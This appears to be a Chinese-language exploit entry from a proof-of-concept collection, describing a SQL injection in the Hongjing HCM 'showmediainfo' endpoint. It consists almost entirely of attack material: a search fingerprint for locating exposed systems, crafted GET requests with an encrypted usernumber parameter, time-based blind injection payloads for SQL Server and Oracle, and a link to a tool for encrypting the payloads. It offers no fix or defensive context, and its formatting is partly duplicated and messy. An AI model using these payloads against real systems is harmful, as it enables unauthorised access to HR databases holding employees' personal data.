# 宏景-showmediainfo-SQL注入漏洞

- **系统**：宏景　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPaRZJpCZEpUlWj2w12PVFssPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1`
- **关键头**：`payload: 1' waitfor delay '0:0:6'--+:`

**请求体 / payload**
```
Payload
加密攻击下载地址:https://github.com/vaycore/HrmsTool/releases/download/0.1/HrmsTool.jar:
Host:
Oracle:
payload:
1' AND 6371=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)CHR(66)CHR(105)CHR(89),6)--
Payload
加密攻击下载地址:https://github.com/vaycore/HrmsTool/releases/download/0.1/HrmsTool.jar:
GET /workbench/duty/showmediainfo?kind=0&usernumber=0JALorlQogBNgRuaXkp7QCus5DXQ1K1RU60C2QunGQUgKkcXUh9HXukA75IwTpCaGcqFlluMQLvPAATTP2HJFPAATTPgvSl8mZXxPAATTP2HJFPAATTPe2LWnL7Rg2Ceg0zzONMioPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
Host:
```